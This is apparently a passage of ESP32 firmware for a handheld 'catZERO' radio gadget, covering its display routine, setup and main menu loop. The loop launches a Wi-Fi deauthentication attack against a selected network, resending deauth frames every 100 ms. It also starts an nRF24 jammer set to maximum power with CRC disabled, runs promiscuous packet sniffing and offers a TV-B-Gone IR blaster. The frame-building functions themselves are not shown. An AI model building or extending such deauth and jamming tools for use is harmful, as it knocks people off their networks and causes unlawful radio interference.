  if (statusMsg != "" && millis() - statusMsgTime < 1500) {
    display.clearDisplay();
    display.setCursor(20, 28);
    display.println(statusMsg);
    drawTopBarWiFiIcon();
    display.display();
    return;
  }
  // Вывод результата команды
  if (appState == STATE_CONSOLE_COMMAND_OUTPUT) {
    display.clearDisplay();
    display.setCursor(0, 10);
    display.println(commandOutput);
    display.setCursor(0, 50);
    display.println("Press OK to exit");
    drawTopBarWiFiIcon();
    display.display();
    if (btnOk()) {
      waitingForOk = false;
      appState = STATE_CONSOLE;
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
      needRedraw = true;
      return;
    }
    if (commandTimeoutSec > 0 && (millis() - commandStartTime >= commandTimeoutSec * 1000UL)) {
      waitingForOk = false;
      appState = STATE_CONSOLE;
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
      needRedraw = true;
    }
    return;
  }
  // Отрисовка текущего меню
  switch (appState) {
    case STATE_MAIN_MENU: drawMainMenu(); break;
    case STATE_WIFI_MENU: drawWifiMenu(); break;
    case STATE_WIFI_SCAN: drawWifiScan(); break;
    case STATE_WIFI_SPECTRUM: drawWifiSpectrum(); break;
    case STATE_WIFI_ACTIONS: drawWifiActions(); break;
    case STATE_WIFI_INFO: drawWifiInfo(); break;
    case STATE_WIFI_CONNECTING: drawWifiConnecting(); break;
    case STATE_NRF24_MENU: drawNrfMenu(); break;
    case STATE_NRF24_SPECTRUM: drawNrfSpectrum(); break;
    case STATE_NRF24_JAMMER: drawNrfJammer(); break;
    case STATE_IR_MENU: drawIrMenu(); break;
    case STATE_IR_CAPTURE: drawIrCapture(); break;
    case STATE_IR_TRANSMIT: drawIrTransmit(); break;
    case STATE_TVBGONE: drawTvbgone(); break;
    case STATE_SETTINGS_MENU: drawSettingsMenu(); break;
    case STATE_SYSTEM_INFO: drawSysInfo(); break;
    case STATE_TIMEOUT: drawTimeoutMenu(); break;
    case STATE_RESET_CONFIRM: drawResetConfirm(); break;
    case STATE_REBOOT_CONFIRM: drawRebootConfirm(); break;
    case STATE_CONSOLE: consoleLoop(); break;
    default: break;
  }
  needRedraw = false;
}

// ----------------------------------------------------------------------------
// ИНИЦИАЛИЗАЦИЯ (SETUP)
// ----------------------------------------------------------------------------
void setup() {
  delay(500);
  deviceBootTime = millis();
  lastActivityTime = millis();
  Serial.begin(115200);
  Serial.println("\ncatZERO v2.5 Starting");

  pinMode(BTN_ANALOG_PIN, INPUT);
  loadTimeout();

  WiFi.mode(WIFI_OFF);
  delay(100);

  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    for (;;);
  }
  showBootLogo();

  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
  SPI.setFrequency(8000000);

  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected()) {
    nrfOk = true;
    nrfErrorMsg = "OK";
    radio.setChannel(42);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.stopListening();
    Serial.println("nRF24 OK");
  } else {
    nrfOk = false;
    nrfErrorMsg = "not found";
    Serial.println("nRF24 FAIL");
  }

  irRx = new IRrecv(IR_RX_PIN);
  irRx->enableIRIn();
  irRxOk = true;
  irTx = new IRsend(IR_TX_PIN);
  irTx->begin();
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    irSlots[i].isValid = false;
  }
  loadIrSlots();

  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_start();
  delay(50);
  initSDCard();

  memset(nrfSmooth, 0, sizeof(nrfSmooth));
  memset(wifiSmooth, 0, sizeof(wifiSmooth));
  appState = STATE_MAIN_MENU;
  needRedraw = true;

  // Попытка автоматического подключения к Wi-Fi
  loadWiFiCredentials();
  if (savedSSID.length() > 0 && savedPassword.length() > 0) {
    delay(500);
    attemptAutoConnect();
  }

  Serial.println("Setup complete");
}

// ----------------------------------------------------------------------------
// ГЛАВНЫЙ ЦИКЛ (LOOP)
// ----------------------------------------------------------------------------
void loop() {
  handleButtons();

  bool up = btnUp();
  bool down = btnDown();
  bool ok = btnOk() && !longPressDetected;

  if (!displayOn && (up || down || ok)) {
    setPower(true);
    lastActivityTime = millis();
    needRedraw = true;
    delay(100);
    up = false; down = false; ok = false;
  }
  if ((up || down || ok) && displayOn) {
    lastActivityTime = millis();
    needRedraw = true;
  }

  // Обработка состояния подключения к Wi-Fi
  if (appState == STATE_WIFI_CONNECTING) {
    if (connectInProgress) {
      if (WiFi.status() == WL_CONNECTED) {
        connectInProgress = false;
        showMsg("Connected to Wi-Fi");
        delay(2000);
        appState = STATE_WIFI_ACTIONS;
        needRedraw = true;
      } else if (millis() - connectStartTime > WIFI_CONNECT_TIMEOUT_MS) {
        connectInProgress = false;
        showMsg("Connection failed");
        delay(2000);
        appState = STATE_WIFI_ACTIONS;
        needRedraw = true;
      } else {
        if (needRedraw && displayOn) drawWifiConnecting();
      }
    } else {
      if (ok) {
        appState = STATE_WIFI_ACTIONS;
        needRedraw = true;
        delay(200);
      }
    }
    if (needRedraw && displayOn) updateDisplay();
    delay(5);
    return;
  }

  // Навигация для всех остальных состояний (кроме консоли и вывода команды)
  if (appState != STATE_CONSOLE && appState != STATE_CONSOLE_COMMAND_OUTPUT) {
    if (up) {
      switch (appState) {
        case STATE_MAIN_MENU: mainIdx = (mainIdx - 1 + MAIN_SIZE) % MAIN_SIZE; break;
        case STATE_WIFI_MENU: wifiMenuIdx = (wifiMenuIdx - 1 + WIFI_MENU_SIZE) % WIFI_MENU_SIZE; break;
        case STATE_WIFI_SCAN:
          if (!wifiScanning) {
            int sz = wifiList.size();
            if (wifiSelectedIdx == -1) { if (sz > 0) wifiSelectedIdx = sz - 1; }
            else { int newIdx = wifiSelectedIdx - 1; if (newIdx >= 0) wifiSelectedIdx = newIdx; else if (newIdx == -1) wifiSelectedIdx = -1; }
          }
          break;
        case STATE_WIFI_ACTIONS: wifiActionIdx = (wifiActionIdx - 1 + WIFI_ACTIONS_SIZE) % WIFI_ACTIONS_SIZE; break;
        case STATE_NRF24_MENU: nrfMenuIdx = (nrfMenuIdx - 1 + NRF_MENU_SIZE) % NRF_MENU_SIZE; break;
        case STATE_IR_MENU: irMenuIdx = (irMenuIdx - 1 + IR_MENU_SIZE) % IR_MENU_SIZE; break;
        case STATE_IR_TRANSMIT: irTxScroll = (irTxScroll - 1 + IR_SLOTS_COUNT + 1) % (IR_SLOTS_COUNT + 1); break;
        case STATE_SETTINGS_MENU: settingsIdx = (settingsIdx - 1 + SETTINGS_SIZE) % SETTINGS_SIZE; break;
        case STATE_TIMEOUT: {
          int opts[] = {0,10,30,60,300};
          int idx = 0; for (int i=0;i<5;i++) if (opts[i]==timeoutVal) idx=i;
          idx = (idx - 1 + 5) % 5;
          timeoutVal = opts[idx];
          needRedraw = true;
          break;
        }
        case STATE_TVBGONE: tvbgone_region = !tvbgone_region; delay(200); break;
        case STATE_RESET_CONFIRM:
          EEPROM.begin(EEPROM_SIZE_BYTES);
          for (int i=0;i<EEPROM_SIZE_BYTES;i++) EEPROM.write(i,0xFF);
          EEPROM.commit();
          EEPROM.end();
          delay(500);
          ESP.restart();
          break;
        case STATE_REBOOT_CONFIRM: ESP.restart(); break;
        default: break;
      }
      delay(150);
    }
    if (down) {
      switch (appState) {
        case STATE_MAIN_MENU: mainIdx = (mainIdx + 1) % MAIN_SIZE; break;
        case STATE_WIFI_MENU: wifiMenuIdx = (wifiMenuIdx + 1) % WIFI_MENU_SIZE; break;
        case STATE_WIFI_SCAN:
          if (!wifiScanning) {
            int sz = wifiList.size();
            if (wifiSelectedIdx == -1) { if (sz > 0) wifiSelectedIdx = 0; }
            else { int newIdx = wifiSelectedIdx + 1; if (newIdx < sz) wifiSelectedIdx = newIdx; else if (newIdx == sz) wifiSelectedIdx = -1; }
          }
          break;
        case STATE_WIFI_ACTIONS: wifiActionIdx = (wifiActionIdx + 1) % WIFI_ACTIONS_SIZE; break;
        case STATE_NRF24_MENU: nrfMenuIdx = (nrfMenuIdx + 1) % NRF_MENU_SIZE; break;
        case STATE_IR_MENU: irMenuIdx = (irMenuIdx + 1) % IR_MENU_SIZE; break;
        case STATE_IR_TRANSMIT: irTxScroll = (irTxScroll + 1) % (IR_SLOTS_COUNT + 1); break;
        case STATE_SETTINGS_MENU: settingsIdx = (settingsIdx + 1) % SETTINGS_SIZE; break;
        case STATE_TIMEOUT: {
          int opts[] = {0,10,30,60,300};
          int idx = 0; for (int i=0;i<5;i++) if (opts[i]==timeoutVal) idx=i;
          idx = (idx + 1) % 5;
          timeoutVal = opts[idx];
          needRedraw = true;
          break;
        }
        case STATE_TVBGONE: tvbgone_region = !tvbgone_region; delay(200); break;
        case STATE_RESET_CONFIRM: case STATE_REBOOT_CONFIRM: appState = STATE_SETTINGS_MENU; needRedraw = true; break;
        default: break;
      }
      delay(150);
    }
    if (ok) {
      switch (appState) {
        case STATE_MAIN_MENU:
          switch (mainIdx) {
            case 0: appState = STATE_WIFI_MENU; wifiMenuIdx=0; break;
            case 1: appState = STATE_NRF24_MENU; nrfMenuIdx=0; break;
            case 2: appState = STATE_IR_MENU; irMenuIdx=0; break;
            case 3: appState = STATE_CONSOLE; consoleMode=CONSOLE_KEYBOARD; selectedKey=0; capsLock=false; consoleText=""; drawKeyboard(); break;
            case 4: appState = STATE_SETTINGS_MENU; settingsIdx=0; break;
          }
          break;
        case STATE_WIFI_MENU:
          switch (wifiMenuIdx) {
            case 0: startWifiScan(); appState = STATE_WIFI_SCAN; break;
            case 1:
              wifiSpectrumActive = true; totalPackets=0; memset(wifiPackets,0,sizeof(wifiPackets)); memset(wifiSmooth,0,sizeof(wifiSmooth));
              currentWifiChan=1; esp_wifi_set_channel(currentWifiChan,WIFI_SECOND_CHAN_NONE);
              esp_wifi_set_promiscuous(true);
              esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
                if(!wifiSpectrumActive) return;
                wifi_promiscuous_pkt_t* pkt=(wifi_promiscuous_pkt_t*)buf;
                int ch=pkt->rx_ctrl.channel;
                if(ch>=1 && ch<=WIFI_CHANNELS) wifiPackets[ch]++;
              });
              appState = STATE_WIFI_SPECTRUM; break;
            case 2: appState = STATE_MAIN_MENU; break;
          }
          break;
        case STATE_WIFI_SCAN:
          if(!wifiScanning) { if(wifiSelectedIdx==-1) appState=STATE_WIFI_MENU; else if(wifiSelectedIdx>=0 && wifiSelectedIdx<(int)wifiList.size()) appState=STATE_WIFI_ACTIONS; }
          break;
        case STATE_WIFI_ACTIONS:
          switch(wifiActionIdx) {
            case 0: appState=STATE_WIFI_INFO; break;
            case 1:
              deauthActive=true; memcpy(targetBSSID,wifiList[wifiSelectedIdx].bssid,6); targetChan=wifiList[wifiSelectedIdx].channel; showMsg("Deauth started");
              break;
            case 2: deauthActive=false; targetChan=0; showMsg("Deauth stopped"); appState=STATE_WIFI_SCAN; break;
            case 3: { // Connect
              if (wifiSelectedIdx >=0 && wifiSelectedIdx<(int)wifiList.size()) {
                String ssid = wifiList[wifiSelectedIdx].ssid;
                String password = inputStringWithKeyboard(true, "Enter password:");
                if (password.length() > 0) {
                  connectSsid = ssid; connectPassword = password; connectInProgress = true; connectStartTime = millis();
                  WiFi.disconnect(true); delay(100); WiFi.mode(WIFI_STA); WiFi.begin(connectSsid.c_str(), connectPassword.c_str());
                  appState = STATE_WIFI_CONNECTING; needRedraw = true;
                } else showMsg("No password");
              } else showMsg("No network selected");
              break;
            }
            case 4: appState=STATE_WIFI_SCAN; break;
          }
          break;
        case STATE_WIFI_INFO: appState=STATE_WIFI_ACTIONS; break;
        case STATE_WIFI_SPECTRUM: wifiSpectrumActive=false; esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_STA); appState=STATE_WIFI_MENU; break;
        case STATE_NRF24_MENU:
          switch(nrfMenuIdx) {
            case 0: nrfCalibrated=false; appState=STATE_NRF24_SPECTRUM; break;
            case 1: if(nrfOk) appState=STATE_NRF24_JAMMER; else showMsg(nrfErrorMsg.c_str()); break;
            case 2: recheckNRF24(); break;
            case 3: appState=STATE_MAIN_MENU; break;
          }
          break;
        case STATE_NRF24_SPECTRUM: appState=STATE_NRF24_MENU; break;
        case STATE_NRF24_JAMMER:
          if(!jamming && nrfOk) startJammer(); else if(jamming) { stopJammer(); appState=STATE_NRF24_MENU; }
          break;
        case STATE_IR_MENU:
          switch(irMenuIdx) {
            case 0: irCapturing=true; irTempReady=false; irTimeout=millis()+15000; if(irRx) irRx->resume(); appState=STATE_IR_CAPTURE; break;
            case 1: irTxScroll=0; appState=STATE_IR_TRANSMIT; break;
            case 2: eraseAllIrSlots(); appState=STATE_IR_MENU; break;
            case 3: appState=STATE_TVBGONE; break;
            case 4: appState=STATE_MAIN_MENU; break;
          }
          break;
        case STATE_IR_CAPTURE:
          if(irTempReady) {
            int freeSlot=-1; for(int i=0;i<IR_SLOTS_COUNT;i++) if(!irSlots[i].isValid) { freeSlot=i; break; }
            if(freeSlot==-1) freeSlot=curIrSlot; curIrSlot=freeSlot;
            irSlots[curIrSlot].rawLength=tempRawLen; memcpy(irSlots[curIrSlot].rawBuffer,tempRaw,tempRawLen*2); irSlots[curIrSlot].protocolName=tempProto; irSlots[curIrSlot].isValid=true; saveIrSlots(); irTempReady=false;
          }
          appState=STATE_IR_MENU; break;
        case STATE_IR_TRANSMIT:
          if(irTxScroll==IR_SLOTS_COUNT) appState=STATE_IR_MENU; else if(irSlots[irTxScroll].isValid) sendIr(irTxScroll);
          break;
        case STATE_TVBGONE: tvbgone_menu(); break;
        case STATE_SETTINGS_MENU:
          switch(settingsIdx) {
            case 0: appState=STATE_SYSTEM_INFO; break;
            case 1: timeoutVal=displayTimeoutSec; appState=STATE_TIMEOUT; break;
            case 2: appState=STATE_RESET_CONFIRM; break;
            case 3: appState=STATE_REBOOT_CONFIRM; break;
            case 4: appState=STATE_MAIN_MENU; break;
          }
          break;
        case STATE_SYSTEM_INFO: appState=STATE_SETTINGS_MENU; break;
        case STATE_TIMEOUT: displayTimeoutSec=timeoutVal; saveTimeout(); appState=STATE_SETTINGS_MENU; break;
        default: break;
      }
      delay(200);
    }
  }

  if (displayOn && displayTimeoutSec > 0 && (millis() - lastActivityTime) > (displayTimeoutSec * 1000UL)) {
    setPower(false);
  }

  // Фоновые процессы
  if (appState == STATE_WIFI_SPECTRUM && wifiSpectrumActive) updateWifiSpectrum();
  if (appState == STATE_NRF24_SPECTRUM && nrfOk) updateNrfSpectrum();
  if (appState == STATE_NRF24_JAMMER && jamming && nrfOk && millis() - lastJamTime > JAM_INTERVAL_MS) updateJammer();
  if (deauthActive && targetChan != 0 && millis() - lastDeauthTime > 100) {
    sendDeauth();
    lastDeauthTime = millis();
  }
  if (appState == STATE_IR_CAPTURE && irCapturing) processIrCapture();

  if (needRedraw && displayOn) updateDisplay();
  delay(5);
}

// =========================== КОНЕЦ ВТОРОЙ ЧАСТИ ===========================
